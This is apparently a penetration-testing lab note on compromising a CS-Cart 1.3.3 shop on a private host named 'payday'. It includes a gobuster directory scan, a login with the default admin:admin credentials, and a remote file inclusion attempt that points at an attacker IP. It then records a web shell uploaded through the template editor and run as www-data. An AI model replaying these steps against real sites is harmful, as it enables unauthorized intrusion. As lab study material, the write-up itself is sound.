# 3 :80 cs-cart internetshop

```
http://192.168.206.39/
Landing Page

$ gobuster dir -u 192.168.206.39 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 80
===============================================================
2021/08/16 14:08:02 Starting gobuster in directory enumeration mode
===============================================================
/image                (Status: 200) [Size: 1971]
/image.php            (Status: 200) [Size: 1971]
/catalog              (Status: 301) [Size: 336] [--> http://192.168.206.39/catalog/]
/admin                (Status: 200) [Size: 9483]
/admin.php            (Status: 200) [Size: 9483]
/images               (Status: 301) [Size: 335] [--> http://192.168.206.39/images/]
/index                (Status: 200) [Size: 28074]
/index.php            (Status: 200) [Size: 28074]
/skins                (Status: 301) [Size: 334] [--> http://192.168.206.39/skins/]
/core                 (Status: 301) [Size: 333] [--> http://192.168.206.39/core/]
/install              (Status: 200) [Size: 7731]
/install.php          (Status: 200) [Size: 7731]
/include              (Status: 301) [Size: 336] [--> http://192.168.206.39/include/]
/classes              (Status: 301) [Size: 336] [--> http://192.168.206.39/classes/]
/config               (Status: 200) [Size: 13]
/config.php           (Status: 200) [Size: 13]
/chart.php            (Status: 200) [Size: 0]
/addons               (Status: 301) [Size: 335] [--> http://192.168.206.39/addons/]
/chart                (Status: 200) [Size: 0]
/var                  (Status: 301) [Size: 332] [--> http://192.168.206.39/var/]
/payments             (Status: 301) [Size: 337] [--> http://192.168.206.39/payments/]
/targets              (Status: 301) [Size: 336] [--> http://192.168.206.39/targets/]

http://192.168.206.39/admin.php
Login Page
# admin:admin worked

http://192.168.206.39/admin.php?version
CS-CART: version 1.3.3

http://192.168.206.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=http://192.168.49.206
Warning: require_once() [function.require-once]: URL file-access is disabled in the server configuration in /var/www/classes/phpmailer/class.cs_phpmailer.php on line 4

Using https://www.exploit-db.com/exploits/48891
Upload web.phtml under Template Editor >
http://192.168.206.39/skins/web.phtml

CMD: whoami;id;hostname
whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
payday
```

```
```
